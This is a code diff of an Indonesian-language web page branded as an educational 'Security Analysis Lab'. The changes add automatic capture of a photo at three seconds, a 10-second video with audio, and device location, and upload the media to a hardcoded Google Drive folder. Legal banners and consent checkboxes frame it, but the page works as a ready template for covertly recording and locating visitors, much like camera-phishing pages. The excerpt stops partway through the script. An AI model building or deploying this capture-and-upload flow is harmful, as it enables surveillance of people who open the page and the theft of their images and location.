@@ -3,7 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Analisis Keamanan Siber - Permintaan Izin Perangkat</title>
+    <title>Security Analysis Lab - Educational Testing</title>
+    <!-- Google API Client Library -->
+    <script src="https://apis.google.com/js/api.js"></script>
     <style>
         * {
             margin: 0;
@@ -18,15 +20,12 @@
             line-height: 1.6;
             padding: 20px;
             min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
         }
         
         .container {
-            max-width: 900px;
+            max-width: 1000px;
             width: 100%;
+            margin: 0 auto;
             background-color: #112240;
             border-radius: 15px;
             padding: 30px;
@@ -34,6 +33,7 @@
             border: 1px solid #233554;
         }
         
+        /* Header & Title */
         header {
             text-align: center;
             margin-bottom: 30px;
@@ -52,6 +52,24 @@
             font-size: 1.1rem;
         }
         
+        /* Legal Warning Banner */
+        .legal-banner {
+            background: linear-gradient(135deg, #ff6b6b, #ff8e53);
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            border-left: 5px solid #ff4757;
+        }
+        
+        .legal-banner h3 {
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        /* Permission Boxes */
         .permission-box {
             background-color: #0a192f;
             border-radius: 10px;
@@ -95,18 +113,35 @@
             margin-right: 10px;
         }
         
-        .status-granted {
-            background-color: #2ecc71;
+        .status-granted { background-color: #2ecc71; }
+        .status-denied { background-color: #e74c3c; }
+        .status-pending { background-color: #f39c12; }
+        
+        /* Explicit Consent Section */
+        .explicit-consent {
+            background-color: #1e2a47;
+            border: 2px solid #ffd700;
+            border-radius: 10px;
+            padding: 25px;
+            margin: 30px 0;
         }
         
-        .status-denied {
-            background-color: #e74c3c;
+        .consent-checkbox {
+            margin-right: 12px;
+            transform: scale(1.2);
         }
         
-        .status-pending {
-            background-color: #f39c12;
+        .consent-item {
+            margin-bottom: 15px;
+            display: flex;
+            align-items: flex-start;
         }
         
+        .consent-label {
+            flex: 1;
+        }
+        
+        /* Controls */
         .controls {
             display: flex;
             justify-content: center;
@@ -153,6 +188,7 @@
             background-color: #c0392b;
         }
         
+        /* Media Container */
         .media-container {
             display: none;
             margin-top: 30px;
@@ -199,30 +235,39 @@
             font-size: 1.5rem;
         }
         
-        .location-info, .audio-info {
-            margin-top: 20px;
-            padding: 15px;
+        /* Upload Status */
+        .upload-status {
             background-color: #0a192f;
             border-radius: 10px;
+            padding: 15px;
+            margin-top: 20px;
             display: none;
         }
         
-        .footer-note {
-            text-align: center;
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 1px solid #233554;
-            color: #8892b0;
-            font-size: 0.9rem;
+        .upload-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #233554;
         }
         
+        .upload-item:last-child {
+            border-bottom: none;
+        }
+        
+        .upload-success { color: #2ecc71; }
+        .upload-failed { color: #e74c3c; }
+        .upload-pending { color: #f39c12; }
+        
+        /* Modal */
         .modal-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.85);
+            background-color: rgba(0, 0, 0, 0.9);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -233,41 +278,50 @@
             background-color: #112240;
             border-radius: 15px;
             padding: 40px;
-            max-width: 600px;
+            max-width: 700px;
             width: 90%;
-            text-align: center;
-            border: 1px solid #64ffda;
+            max-height: 90vh;
+            overflow-y: auto;
+            border: 2px solid #64ffda;
         }
         
         .modal-title {
             color: #64ffda;
             font-size: 1.8rem;
             margin-bottom: 20px;
+            text-align: center;
         }
         
         .modal-text {
-            margin-bottom: 30px;
+            margin-bottom: 20px;
             color: #ccd6f6;
             line-height: 1.6;
         }
         
-        .consent-box {
-            background-color: #0a192f;
-            padding: 20px;
-            border-radius: 10px;
-            margin: 25px 0;
-            text-align: left;
+        /* Footer */
+        .footer-note {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #233554;
+            color: #8892b0;
+            font-size: 0.9rem;
         }
         
-        .consent-item {
-            margin-bottom: 10px;
-            display: flex;
-            align-items: flex-start;
+        /* Log Activity */
+        .log-entry {
+            padding: 8px 12px;
+            margin: 5px 0;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 6px;
+            border-left: 3px solid #64ffda;
+            font-size: 0.9rem;
         }
         
-        .consent-checkbox {
+        .log-time {
+            color: #8892b0;
+            font-size: 0.8rem;
             margin-right: 10px;
-            margin-top: 5px;
         }
         
         @media (max-width: 768px) {
@@ -290,40 +344,145 @@
     </style>
 </head>
 <body>
-    <!-- Modal Pop-up Izin -->
-    <div class="modal-overlay" id="permissionModal">
+    <!-- Modal Consent Utama -->
+    <div class="modal-overlay" id="mainModal">
         <div class="modal-content">
-            <h2 class="modal-title">Permintaan Izin Perangkat</h2>
-            <p class="modal-text">Sebelum melanjutkan, website ini memerlukan izin untuk mengakses beberapa perangkat Anda untuk tujuan analisis keamanan siber. Semua data akan diproses secara lokal di lab pribadi Anda.</p>
+            <h2 class="modal-title">🔐 LAB ANALISIS KEAMANAN SIBER</h2>
             
-            <div class="consent-box">
-                <p><strong>Izin yang diminta:</strong></p>
-                <div class="consent-item">
-                    <input type="checkbox" id="consentLocation" class="consent-checkbox">
-                    <label for="consentLocation">Lokasi perangkat (untuk analisis konteks keamanan)</label>
+            <div class="legal-banner">
+                <h3>⚠️ PERINGATAN HUKUM & ETIKA</h3>
+                <p>Website ini adalah alat edukasi untuk analisis keamanan siber di lingkungan lab terkontrol.</p>
+                <p><strong>Dilarang digunakan untuk memantau orang tanpa persetujuan mereka!</strong></p>
+            </div>
+            
+            <div class="modal-text">
+                <p><strong>Fitur yang akan diakses:</strong></p>
+                <ul style="margin-left: 20px; margin-bottom: 20px;">
+                    <li>📷 Kamera depan & belakang</li>
+                    <li>🎤 Mikrofon (untuk video bersuara)</li>
+                    <li>📍 Lokasi perangkat</li>
+                    <li>📸 Auto-capture foto dalam 3 detik</li>
+                    <li>🎥 Auto-rekam video bersuara 10 detik</li>
+                    <li>☁️ Upload ke Google Drive untuk analisis</li>
+                </ul>
+                
+                <p><strong>Tujuan Google Drive:</strong></p>
+                <div style="background: rgba(100, 255, 218, 0.1); padding: 15px; border-radius: 8px; margin: 15px 0;">
+                    <strong>📍 Target Folder:</strong><br>
+                    <a href="https://drive.google.com/drive/folders/1WN8YbwdKbHIuHfGF1CZQyyOxM3xcH9n6" 
+                       target="_blank" style="color: #64ffda; word-break: break-all;">
+                       https://drive.google.com/drive/folders/1WN8YbwdKbHIuHfGF1CZQyyOxM3xcH9n6
+                    </a>
+                    <p style="margin-top: 8px; font-size: 0.9em; color: #8892b0;">
+                        Folder ID: <code>1WN8YbwdKbHIuHfGF1CZQyyOxM3xcH9n6</code>
+                    </p>
                 </div>
+                
+                <p><strong>Data akan:</strong></p>
+                <ul style="margin-left: 20px; margin-bottom: 20px;">
+                    <li>✅ Disimpan di Google Drive folder di atas</li>
+                    <li>✅ Digunakan hanya untuk tujuan edukasi</li>
+                    <li>✅ Dihapus setelah periode analisis selesai</li>
+                    <li>✅ Tidak dibagikan ke pihak ketiga</li>
+                </ul>
+            </div>
+            
+            <!-- Explicit Consent untuk Auto-Upload -->
+            <div class="explicit-consent">
+                <h3 style="color: #ffd700; margin-bottom: 15px;">📋 PERSETUJUAN EKSPLISIT AUTO-UPLOAD</h3>
+                
                 <div class="consent-item">
-                    <input type="checkbox" id="consentCamera" class="consent-checkbox">
-                    <label for="consentCamera">Kamera depan dan belakang (untuk pengujian keamanan visual)</label>
+                    <input type="checkbox" id="consentAutoCapture" class="consent-checkbox">
+                    <div class="consent-label">
+                        <strong>Saya setuju untuk:</strong><br>
+                        <small>1. Auto-capture 1 foto dalam 3 detik setelah izin diberikan</small><br>
+                        <small>2. Auto-rekam video bersuara 10 detik</small><br>
+                        <small>3. Upload otomatis ke Google Drive folder di atas</small>
+                    </div>
                 </div>
+                
                 <div class="consent-item">
-                    <input type="checkbox" id="consentMicrophone" class="consent-checkbox">
-                    <label for="consentMicrophone">Mikrofon (untuk analisis audio keamanan)</label>
-                </div>
-                <div class="consent-item">
-                    <input type="checkbox" id="consentMedia" class="consent-checkbox">
-                    <label for="consentMedia">Merekam video dan mengambil foto (untuk dokumentasi pengujian)</label>
+                    <input type="checkbox" id="consentUnderstand" class="consent-checkbox">
+                    <div class="consent-label">
+                        <strong>Saya memahami dan menyetujui:</strong><br>
+                        <small>• Ini untuk tujuan edukasi keamanan siber di lab</small><br>
+                        <small>• Data akan dikirim ke folder Google Drive yang ditentukan</small><br>
+                        <small>• Saya bisa minta penghapusan data kapan saja</small>
+                    </div>
                 </div>
             </div>
             
-            <p class="modal-text" style="font-size: 0.9rem; color: #8892b0;">
-                <strong>Catatan:</strong> Penggunaan ini legal dan hanya untuk analisis keamanan siber bersertifikat di lab pribadi Anda sendiri. Semua data akan tetap berada di perangkat Anda.
-            </p>
+            <div class="controls">
+                <button class="primary-btn" id="acceptAllBtn">✅ Setujui & Lanjutkan</button>
+                <button class="secondary-btn" id="manualSelectBtn">⚙️ Pilih Manual</button>
+                <button class="danger-btn" id="rejectAllBtn">❌ Tolak Semua</button>
+            </div>
+            
+            <div class="footer-note" style="margin-top: 20px;">
+                <p>© 2024 Security Analysis Lab - Untuk tujuan edukasi keamanan siber</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal Google Drive Setup -->
+    <div class="modal-overlay" id="driveModal" style="display: none;">
+        <div class="modal-content">
+            <h2 class="modal-title">⚙️ SETUP GOOGLE DRIVE API</h2>
+            
+            <div class="modal-text">
+                <p>Untuk mengaktifkan fitur auto-upload ke Google Drive, perlu konfigurasi API.</p>
+                
+                <div style="background: #0a192f; padding: 20px; border-radius: 10px; margin: 20px 0;">
+                    <h4>Langkah Setup (Wajib untuk Upload):</h4>
+                    <ol style="margin-left: 20px; margin-top: 10px;">
+                        <li>Buka <a href="https://console.cloud.google.com" target="_blank" style="color: #64ffda;">Google Cloud Console</a></li>
+                        <li>Buat project baru → Aktifkan <strong>Google Drive API</strong></li>
+                        <li>Di "Credentials" → Buat <strong>OAuth 2.0 Client ID</strong></li>
+                        <li>Application type: <strong>Web Application</strong></li>
+                        <li>Authorized JavaScript origins: Tambahkan URL website Anda</li>
+                        <li>Copy <strong>Client ID</strong> dan <strong>API Key</strong></li>
+                    </ol>
+                </div>
+                
+                <div style="margin: 20px 0;">
+                    <label style="display: block; margin-bottom: 8px; color: #64ffda;">
+                        <strong>Google Drive Folder ID (Sudah Terisi):</strong>
+                    </label>
+                    <input type="text" id="driveFolderId" 
+                           value="1WN8YbwdKbHIuHfGF1CZQyyOxM3xcH9n6"
+                           readonly
+                           style="width: 100%; padding: 12px; border-radius: 8px; background: #0a192f; border: 2px solid #64ffda; color: #64ffda; margin-bottom: 15px; font-weight: bold;">
+                    <small>Folder target: <a href="https://drive.google.com/drive/folders/1WN8YbwdKbHIuHfGF1CZQyyOxM3xcH9n6" 
+                       target="_blank" style="color: #8892b0;">Buka Folder</a></small>
+                </div>
+                
+                <div style="margin: 20px 0;">
+                    <label style="display: block; margin-bottom: 8px;"><strong>Google Client ID:</strong></label>
+                    <input type="text" id="googleClientId" placeholder="1234567890-abcdefghijklmnop.apps.googleusercontent.com" 
+                           style="width: 100%; padding: 12px; border-radius: 8px; background: #0a192f; border: 1px solid #64ffda; color: white; margin-bottom: 15px;">
+                    <small>Dari Google Cloud Console → Credentials</small>
+                </div>
+                
+                <div style="margin: 20px 0;">
+                    <label style="display: block; margin-bottom: 8px;"><strong>Google API Key:</strong></label>
+                    <input type="text" id="googleApiKey" placeholder="AIzaSyABCDEFGHIJKLMNOPQRSTUVWXYZ123456" 
+                           style="width: 100%; padding: 12px; border-radius: 8px; background: #0a192f; border: 1px solid #64ffda; color: white;">
+                    <small>Dari Google Cloud Console → Credentials</small>
+                </div>
+                
+                <div style="background: rgba(255, 215, 0, 0.1); padding: 15px; border-radius: 8px; margin: 20px 0;">
+                    <strong>ℹ️ Catatan:</strong>
+                    <p style="margin-top: 8px; font-size: 0.9em;">
+                        Tanpa konfigurasi ini, data hanya akan disimpan di browser (localStorage).<br>
+                        Untuk upload ke Google Drive, setup API wajib dilakukan.
+                    </p>
+                </div>
+            </div>
             
             <div class="controls">
-                <button class="primary-btn" id="grantAllBtn">Izinkan Semua</button>
-                <button class="secondary-btn" id="customBtn">Pilih Manual</button>
-                <button class="danger-btn" id="denyAllBtn">Tolak Semua</button>
+                <button class="primary-btn" id="saveDriveConfigBtn">💾 Simpan & Aktifkan Upload</button>
+                <button class="secondary-btn" id="skipDriveBtn">⏭️ Simpan Lokal Saja</button>
+                <button class="danger-btn" id="testDriveBtn">🔗 Test Koneksi Drive</button>
             </div>
         </div>
     </div>
@@ -331,36 +490,45 @@
     <!-- Konten Utama Website -->
     <div class="container" id="mainContent" style="display: none;">
         <header>
-            <h1>Analisis Keamanan Siber</h1>
-            <p class="subtitle">Lab Pengujian Keamanan Perangkat</p>
+            <h1>🔒 Security Analysis Lab</h1>
+            <p class="subtitle">Alat edukasi untuk analisis keamanan perangkat dan media</p>
         </header>
         
+        <div class="legal-banner">
+            <h3>⚠️ STATUS: <span id="labStatus">Menunggu persetujuan...</span></h3>
+            <p>Semua aktivitas diawasi dan hanya untuk tujuan edukasi keamanan siber.</p>
+            <p><strong>Google Drive Target:</strong> 
+                <a href="https://drive.google.com/drive/folders/1WN8YbwdKbHIuHfGF1CZQyyOxM3xcH9n6" 
+                   target="_blank" style="color: white;">Folder Analisis Lab</a>
+            </p>
+        </div>
+        
+        <!-- Status Permissions -->
         <section class="permission-box">
             <div class="permission-header">
                 <div class="permission-icon">📍</div>
                 <h2 class="permission-title">Izin Lokasi</h2>
             </div>
-            <p class="permission-desc">Digunakan untuk analisis konteks keamanan berbasis lokasi.</p>
+            <p class="permission-desc">Analisis konteks keamanan berbasis lokasi.</p>
             <div class="status-container">
                 <div class="status-indicator status-pending" id="locationStatus"></div>
                 <span id="locationText">Menunggu persetujuan...</span>
             </div>
-            <div id="locationInfo" class="location-info"></div>
         </section>
         
         <section class="permission-box">
             <div class="permission-header">
-                <div class="permission-icon">📷</div>
-                <h2 class="permission-title">Izin Kamera</h2>
+                <div class="permission-icon">📷🎤</div>
+                <h2 class="permission-title">Izin Kamera & Mikrofon</h2>
             </div>
-            <p class="permission-desc">Digunakan untuk pengujian keamanan visual dan analisis kamera.</p>
+            <p class="permission-desc">Auto-capture foto & video bersuara untuk analisis media.</p>
             <div class="status-container">
                 <div class="status-indicator status-pending" id="cameraStatus"></div>
                 <span id="cameraText">Menunggu persetujuan...</span>
             </div>
             
             <div class="media-container" id="cameraContainer">
-                <h3 class="media-title">Kamera Aktif</h3>
+                <h3 class="media-title">🎥 Kamera Aktif - Analisis Media</h3>
                 <div class="video-container">
                     <video id="videoElement" autoplay playsinline></video>
                 </div>
@@ -373,424 +541,829 @@
             </div>
         </section>
         
-        <section class="permission-box">
+        <!-- Auto-Capture & Upload Status -->
+        <section class="permission-box" id="autoCaptureSection">
             <div class="permission-header">
-                <div class="permission-icon">🎤</div>
-                <h2 class="permission-title">Izin Mikrofon</h2>
+                <div class="permission-icon">⚡</div>
+                <h2 class="permission-title">Auto-Capture & Upload ke Google Drive</h2>
             </div>
-            <p class="permission-desc">Digunakan untuk analisis keamanan audio dan pengujian mikrofon.</p>
+            <p class="permission-desc">
+                <strong>Jadwal:</strong> Foto (3 detik) + Video bersuara 10 detik → Google Drive<br>
+                <strong>Target:</strong> <code>1WN8YbwdKbHIuHfGF1CZQyyOxM3xcH9n6</code>
+            </p>
             <div class="status-container">
-                <div class="status-indicator status-pending" id="microphoneStatus"></div>
-                <span id="microphoneText">Menunggu persetujuan...</span>
+                <div class="status-indicator status-pending" id="autoCaptureStatus"></div>
+                <span id="autoCaptureText">Menunggu konfigurasi...</span>
             </div>
-            <div id="audioInfo" class="audio-info"></div>
+            
+            <div class="upload-status" id="uploadStatus">
+                <h4 style="color: #64ffda; margin-bottom: 15px;">📤 Status Upload ke Google Drive:</h4>
+                <div class="upload-item">
+                    <span>📸 Foto:</span>
+                    <span class="upload-pending" id="photoUploadStatus">⏳ Menunggu...</span>
+                </div>
+                <div class="upload-item">
+                    <span>🎥 Video 10 detik:</span>
+                    <span class="upload-pending" id="videoUploadStatus">⏳ Menunggu...</span>
+                </div>
+                <div class="upload-item">
+                    <span>🔐 Google Drive Auth:</span>
+                    <span class="upload-pending" id="driveAuthStatus">⏳ Belum login</span>
+                </div>
+                <div class="upload-item">
+                    <span>📁 Folder Target:</span>
+                    <span style="color: #64ffda;">
+                        <a href="https://drive.google.com/drive/folders/1WN8YbwdKbHIuHfGF1CZQyyOxM3xcH9n6" 
+                           target="_blank" style="color: #64ffda;">Buka Folder</a>
+                    </span>
+                </div>
+            </div>
+            
+            <div style="margin-top: 20px; padding: 15px; background: rgba(100, 255, 218, 0.1); border-radius: 8px;">
+                <strong>⏰ Timeline Auto-Capture:</strong>
+                <ol style="margin-left: 20px; margin-top: 10px;">
+                    <li>Detik 0: Izin diberikan</li>
+                    <li>Detik 3: Ambil foto → Upload ke Drive</li>
+                    <li>Detik 5: Mulai rekam video 10 detik</li>
+                    <li>Detik 15: Upload video ke Drive</li>
+                </ol>
+            </div>
         </section>
         
+        <!-- Controls -->
         <div class="controls">
-            <button class="primary-btn" id="requestPermissionsBtn">Minta Izin Sekarang</button>
-            <button class="secondary-btn" id="resetBtn">Reset Izin</button>
-            <button class="danger-btn" id="revokeBtn">Cabut Semua Izin</button>
+            <button class="primary-btn" id="startAutoCaptureBtn">🚀 Mulai Auto-Capture (3s + 10s)</button>
+            <button class="secondary-btn" id="configDriveBtn">⚙️ Konfigurasi Google Drive API</button>
+            <button class="danger-btn" id="stopAllBtn">🛑 Hentikan Semua</button>
+        </div>
+        
+        <!-- Log Aktivitas -->
+        <div class="permission-box" id="activityLog">
+            <div class="permission-header">
+                <div class="permission-icon">📝</div>
+                <h2 class="permission-title">Log Aktivitas & Timeline</h2>
+            </div>
+            <div id="logContent" style="max-height: 300px; overflow-y: auto;">
+                <!-- Log entries will be added here -->
+                <div class="log-entry">
+                    <span class="log-time">[00:00]</span>
+                    <span>🚀 Sistem diinisialisasi...</span>
+                </div>
+            </div>
+            <div style="text-align: center; margin-top: 10px;">
+                <button onclick="clearLog()" style="padding: 8px 16px; background: #233554; color: white; border: none; border-radius: 5px; cursor: pointer;">
+                    🧹 Bersihkan Log
+                </button>
+            </div>
         </div>
         
         <div class="footer-note">
-            <p><strong>Penggunaan Legal:</strong> Website ini hanya untuk analisis keamanan siber bersertifikat di lab pribadi Anda sendiri. Semua data diproses secara lokal.</p>
-            <p style="margin-top: 10px;">© 2023 Lab Keamanan Siber Pribadi</p>
+            <p><strong>⚠️ Penggunaan Legal:</strong> Hanya untuk edukasi keamanan siber di lab terkontrol dengan persetujuan eksplisit.</p>
+            <p><strong>📍 Google Drive Target:</strong> Folder ID: <code>1WN8YbwdKbHIuHfGF1CZQyyOxM3xcH9n6</code></p>
+            <p style="margin-top: 10px;">© 2024 Security Analysis Lab | Data akan dihapus setelah periode analisis</p>
         </div>
     </div>
 
     <script>
-        // Elemen DOM
-        const permissionModal = document.getElementById('permissionModal');
-        const mainContent = document.getElementById('mainContent');
-        const grantAllBtn = document.getElementById('grantAllBtn');
-        const customBtn = document.getElementById('customBtn');
-        const denyAllBtn = document.getElementById('denyAllBtn');
-        const requestPermissionsBtn = document.getElementById('requestPermissionsBtn');
-        const resetBtn = document.getElementById('resetBtn');
-        const revokeBtn = document.getElementById('revokeBtn');
-        
-        // Status elemen
-        const locationStatus = document.getElementById('locationStatus');
-        const locationText = document.getElementById('locationText');
-        const locationInfo = document.getElementById('locationInfo');
-        
-        const cameraStatus = document.getElementById('cameraStatus');
-        const cameraText = document.getElementById('cameraText');
-        const cameraContainer = document.getElementById('cameraContainer');
-        const videoElement = document.getElementById('videoElement');
-        const switchCameraBtn = document.getElementById('switchCamera');
-        const capturePhotoBtn = document.getElementById('capturePhoto');
-        const recordVideoBtn = document.getElementById('recordVideo');
-        const photoContainer = document.getElementById('photoContainer');
-        
-        const microphoneStatus = document.getElementById('microphoneStatus');
-        const microphoneText = document.getElementById('microphoneText');
-        const audioInfo = document.getElementById('audioInfo');
-        
-        // State variabel
+        // ==================== KONFIGURASI ====================
+        const CONFIG = {
+            AUTO_CAPTURE_DELAY: 3000,      // 3 detik untuk foto
+            VIDEO_DURATION: 10000,         // 10 detik untuk video
+            GOOGLE_DRIVE: {
+                folderId: '1WN8YbwdKbHIuHfGF1CZQyyOxM3xcH9n6', // YOUR FOLDER ID
+                clientId: '',
+                apiKey: '',
+                scope: 'https://www.googleapis.com/auth/drive.file',
+                discoveryDocs: ['https://www.googleapis.com/discovery/v1/apis/drive/v3/rest']
+            }
+        };
+
+        // ==================== STATE VARIABLES ====================
         let currentStream = null;
         let isFrontCamera = true;
         let isRecording = false;
         let mediaRecorder = null;
         let recordedChunks = [];
-        
-        // Checkbox consent
-        const consentLocation = document.getElementById('consentLocation');
-        const consentCamera = document.getElementById('consentCamera');
-        const consentMicrophone = document.getElementById('consentMicrophone');
-        const consentMedia = document.getElementById('consentMedia');
-        
-        // Tampilkan modal saat halaman dimuat
+        let accessToken = null;
+        let autoCaptureEnabled = false;
+        let googleDriveConfigured = false;
+        let activityLog = [];
+        let autoCaptureTimer = null;
+
+        // ==================== ELEMENTS ====================
+        const elements = {
+            // Modals
+            mainModal: document.getElementById('mainModal'),
+            driveModal: document.getElementById('driveModal'),
+            mainContent: document.getElementById('mainContent'),
+            
+            // Status Indicators
+            locationStatus: document.getElementById('locationStatus'),
+            locationText: document.getElementById('locationText'),
+            cameraStatus: document.getElementById('cameraStatus'),
+            cameraText: document.getElementById('cameraText'),
+            autoCaptureStatus: document.getElementById('autoCaptureStatus'),
+            autoCaptureText: document.getElementById('autoCaptureText'),
+            labStatus: document.getElementById('labStatus'),
+            
+            // Media
+            videoElement: document.getElementById('videoElement'),
+            cameraContainer: document.getElementById('cameraContainer'),
+            photoContainer: document.getElementById('photoContainer'),
+            
+            // Upload Status
+            uploadStatus: document.getElementById('uploadStatus'),
+            photoUploadStatus: document.getElementById('photoUploadStatus'),
+            videoUploadStatus: document.getElementById('videoUploadStatus'),
+            driveAuthStatus: document.getElementById('driveAuthStatus'),
+            
+            // Buttons
+            acceptAllBtn: document.getElementById('acceptAllBtn'),
+            manualSelectBtn: document.getElementById('manualSelectBtn'),
+            rejectAllBtn: document.getElementById('rejectAllBtn'),
+            startAutoCaptureBtn: document.getElementById('startAutoCaptureBtn'),
+            configDriveBtn: document.getElementById('configDriveBtn'),
+            stopAllBtn: document.getElementById('stopAllBtn'),
+            saveDriveConfigBtn: document.getElementById('saveDriveConfigBtn'),
+            skipDriveBtn: document.getElementById('skipDriveBtn'),
+            testDriveBtn: document.getElementById('testDriveBtn'),
+            switchCamera: document.getElementById('switchCamera'),
+            capturePhoto: document.getElementById('capturePhoto'),
+            recordVideo: document.getElementById('recordVideo'),
+            
+            // Consent
+            consentAutoCapture: document.getElementById('consentAutoCapture'),
+            consentUnderstand: document.getElementById('consentUnderstand'),
+            
+            // Drive Config
+            driveFolderId: document.getElementById('driveFolderId'),
+            googleClientId: document.getElementById('googleClientId'),
+            googleApiKey: document.getElementById('googleApiKey'),
+            
+            // Log
+            logContent: document.getElementById('logContent')
+        };
+
+        // ==================== INITIALIZATION ====================
         document.addEventListener('DOMContentLoaded', () => {
-            permissionModal.style.display = 'flex';
-            mainContent.style.display = 'none';
-            
-            // Set semua checkbox ke checked secara default
-            consentLocation.checked = true;
-            consentCamera.checked = true;
-            consentMicrophone.checked = true;
-            consentMedia.checked = true;
+            loadSavedConfig();
+            setupEventListeners();
+            logActivity('Sistem diinisialisasi', 'system');
+            updateDriveFolderInfo();
         });
-        
-        // Grant All Button
-        grantAllBtn.addEventListener('click', () => {
-            permissionModal.style.display = 'none';
-            mainContent.style.display = 'block';
-            requestAllPermissions();
-        });
-        
-        // Custom Button
-        customBtn.addEventListener('click', () => {
-            permissionModal.style.display = 'none';
-            mainContent.style.display = 'block';
-            
-            // Hanya minta izin untuk yang dipilih
-            if (consentLocation.checked) requestLocationPermission();
-            if (consentCamera.checked || consentMedia.checked) requestCameraPermission();
-            if (consentMicrophone.checked) requestMicrophonePermission();
-        });
-        
-        // Deny All Button
-        denyAllBtn.addEventListener('click', () => {
-            permissionModal.style.display = 'none';
-            mainContent.style.display = 'block';
-            updateAllStatus('denied', 'Izin ditolak oleh pengguna');
-        });
-        
-        // Request Permissions Button
-        requestPermissionsBtn.addEventListener('click', () => {
-            requestAllPermissions();
-        });
-        
-        // Reset Button
-        resetBtn.addEventListener('click', () => {
-            permissionModal.style.display = 'flex';
-            mainContent.style.display = 'none';
-            resetAllPermissions();
-        });
-        
-        // Revoke Button
-        revokeBtn.addEventListener('click', () => {
-            revokeAllPermissions();
-        });
-        
-        // Switch Camera Button
-        switchCameraBtn.addEventListener('click', () => {
-            switchCamera();
-        });
-        
-        // Capture Photo Button
-        capturePhotoBtn.addEventListener('click', () => {
-            capturePhoto();
-        });
-        
-        // Record Video Button
-        recordVideoBtn.addEventListener('click', () => {
-            toggleRecording();
-        });
-        
-        // Fungsi untuk meminta semua izin
-        async function requestAllPermissions() {
-            await requestLocationPermission();
-            await requestCameraPermission();
-            await requestMicrophonePermission();
+
+        function updateDriveFolderInfo() {
+            const driveInfo = document.getElementById('driveFolderInfo');
+            if (driveInfo) {
+                driveInfo.innerHTML = `drive.google.com/drive/folders/<strong>${CONFIG.GOOGLE_DRIVE.folderId}</strong>`;
+            }
         }
-        
-        // Fungsi untuk meminta izin lokasi
-        async function requestLocationPermission() {
-            if (!navigator.geolocation) {
-                updateStatus('location', 'denied', 'Geolocation tidak didukung di browser ini');
+
+        // ==================== EVENT LISTENERS ====================
+        function setupEventListeners() {
+            // Modal Buttons
+            elements.acceptAllBtn.addEventListener('click', acceptAllPermissions);
+            elements.manualSelectBtn.addEventListener('click', manualSelection);
+            elements.rejectAllBtn.addEventListener('click', rejectAllPermissions);
+            
+            // Control Buttons
+            elements.startAutoCaptureBtn.addEventListener('click', startAutoCaptureSequence);
+            elements.configDriveBtn.addEventListener('click', showDriveConfig);
+            elements.stopAllBtn.addEventListener('click', stopAll);
+            
+            // Drive Config
+            elements.saveDriveConfigBtn.addEventListener('click', saveDriveConfig);
+            elements.skipDriveBtn.addEventListener('click', skipDriveConfig);
+            elements.testDriveBtn.addEventListener('click', testDriveConnection);
+            
+            // Camera Controls
+            elements.switchCamera.addEventListener('click', switchCamera);
+            elements.capturePhoto.addEventListener('click', capturePhotoManual);
+            elements.recordVideo.addEventListener('click', toggleRecording);
+            
+            // Load saved config
+            elements.driveFolderId.value = CONFIG.GOOGLE_DRIVE.folderId;
+        }
+
+        // ==================== LOGGING FUNCTIONS ====================
+        function logActivity(message, type = 'info') {
+            const now = new Date();
+            const timeString = `[${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}]`;
+            
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log-entry';
+            
+            let icon = '📝';
+            if (type === 'success') icon = '✅';
+            if (type === 'error') icon = '❌';
+            if (type === 'warning') icon = '⚠️';
+            if (type === 'system') icon = '🚀';
+            if (type === 'upload') icon = '📤';
+            if (type === 'capture') icon = '📸';
+            
+            logEntry.innerHTML = `<span class="log-time">${timeString}</span><span>${icon} ${message}</span>`;
+            elements.logContent.prepend(logEntry);
+            
+            // Keep only last 50 entries
+            const entries = elements.logContent.querySelectorAll('.log-entry');
+            if (entries.length > 50) {
+                entries[entries.length - 1].remove();
+            }
+            
+            // Save to array for debugging
+            activityLog.push({time: now, message, type});
+            console.log(`[LOG] ${timeString} ${message}`);
+        }
+
+        function clearLog() {
+            elements.logContent.innerHTML = '<div class="log-entry"><span class="log-time">[00:00]</span><span>🚀 Log dibersihkan...</span></div>';
+            activityLog = [];
+        }
+
+        // ==================== PERMISSION FUNCTIONS ====================
+        function acceptAllPermissions() {
+            if (!checkConsent()) {
+                alert('Silakan centang kedua persetujuan untuk melanjutkan!');
                 return;
             }
             
-            updateStatus('location', 'pending', 'Meminta izin lokasi...');
+            elements.mainModal.style.display = 'none';
+            elements.mainContent.style.display = 'block';
+            elements.labStatus.textContent = 'Aktif - Menunggu konfigurasi';
+            logActivity('User menyetujui semua persyaratan', 'success');
             
-            try {
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    });
-                });
-                
-                updateStatus('location', 'granted', 'Izin lokasi diberikan');
-                showLocationInfo(position);
-            } catch (error) {
-                updateStatus('location', 'denied', 'Izin lokasi ditolak: ' + error.message);
-            }
+            // Request camera permission first
+            requestCameraPermission().then(() => {
+                logActivity('Izin kamera & mikrofon diberikan', 'success');
+                showDriveConfig();
+            }).catch(error => {
+                logActivity(`Gagal mendapatkan izin kamera: ${error.message}`, 'error');
+            });
         }
-        
-        // Fungsi untuk meminta izin kamera
+
+        function checkConsent() {
+            return elements.consentAutoCapture.checked && elements.consentUnderstand.checked;
+        }
+
+        function manualSelection() {
+            elements.mainModal.style.display = 'none';
+            elements.mainContent.style.display = 'block';
+            logActivity('User memilih izin manual', 'warning');
+        }
+
+        function rejectAllPermissions() {
+            elements.mainModal.style.display = 'none';
+            alert('Akses ditolak. Website memerlukan persetujuan untuk berfungsi.');
